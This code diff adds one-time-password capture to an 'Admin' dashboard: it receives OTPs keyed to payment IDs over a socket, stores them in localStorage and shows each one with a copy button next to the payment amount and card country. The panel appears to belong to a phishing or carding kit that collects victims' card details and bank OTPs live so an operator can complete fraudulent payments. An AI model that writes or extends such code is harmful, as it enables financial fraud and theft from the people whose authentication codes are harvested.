@@ -87,8 +87,22 @@ const Admin = () => {
       return [];
     }
   });
-  const [otps, setOtps] = useState<OtpData[]>([]);
+  // Load OTPs from localStorage on mount
+  const [otps, setOtps] = useState<OtpData[]>(() => {
+    try {
+      const savedOtps = localStorage.getItem('adminOtps');
+      return savedOtps ? JSON.parse(savedOtps) : [];
+    } catch (error) {
+      console.error('Error loading OTPs from localStorage:', error);
+      return [];
+    }
+  });
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
+
+  // Save OTPs to localStorage whenever otps state changes
+  useEffect(() => {
+    localStorage.setItem('adminOtps', JSON.stringify(otps));
+  }, [otps]);
   
   // Load live visitors from localStorage on mount with heartbeat recovery
   const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>(() => {
@@ -894,6 +908,37 @@ const Admin = () => {
         }
       });
 
+      // Listen for OTP submissions
+      socket.on('otp-submitted', (data: { paymentId: string, otp: string }) => {
+        try {
+          if (!data || !data.paymentId || !data.otp) {
+            console.error('Invalid OTP data received:', data);
+            return;
+          }
+          
+          const newOtp: OtpData = {
+            paymentId: data.paymentId,
+            otp: data.otp,
+            timestamp: new Date().toISOString()
+          };
+          
+          console.log('📱 OTP received:', newOtp);
+          
+          // Add to OTP list (newest first)
+          setOtps(prev => {
+            const updated = [newOtp, ...prev.filter(otp => otp.paymentId !== data.paymentId)];
+            // Keep only last 10 OTPs to prevent memory issues
+            const limited = updated.slice(0, 10);
+            // Save to localStorage
+            localStorage.setItem('adminOtps', JSON.stringify(limited));
+            return limited;
+          });
+          
+        } catch (error) {
+          console.error('Error processing OTP submission:', error);
+        }
+      });
+
       return () => {
         socket.off('payment-received');
         socket.off('payment-data');
@@ -1674,6 +1719,9 @@ const Admin = () => {
                     Amount
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                    OTP
+                  </th>
+                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                     Country
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
@@ -1687,7 +1735,7 @@ const Admin = () => {
               <tbody className="divide-y divide-gray-700">
                 {payments.length === 0 ? (
                   <tr>
-                    <td colSpan={10} className="px-6 py-8 text-center text-gray-400">
+                    <td colSpan={11} className="px-6 py-8 text-center text-gray-400">
                       No payment data received yet. Waiting for transactions...
                     </td>
                   </tr>
@@ -1739,6 +1787,32 @@ const Admin = () => {
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                         ₹{payment.amount.toLocaleString()}
+                      </td>
+                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                        {(() => {
+                          const paymentOtp = otps.find(otp => otp.paymentId === payment.paymentId);
+                          return paymentOtp ? (
+                            <div className="flex items-center gap-2">
+                              <span className="text-lg font-bold text-blue-300 bg-blue-900 px-2 py-1 rounded font-mono border border-blue-700">
+                                {paymentOtp.otp}
+                              </span>
+                              <Button
+                                variant="ghost"
+                                size="sm"
+                                onClick={(e) => {
+                                  e.stopPropagation();
+                                  copyToClipboard(paymentOtp.otp);
+                                }}
+                                className="h-6 w-6 p-0 text-blue-400 hover:text-blue-100"
+                              >
+                                <Copy className="h-3 w-3" />
+                              </Button>
+                            </div>
+                          ) : (
+                            <span className="text-gray-500 text-xs">No OTP</span>
+                          );
+                        })()
+                        }
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm">
                         {payment.cardCountry ? (
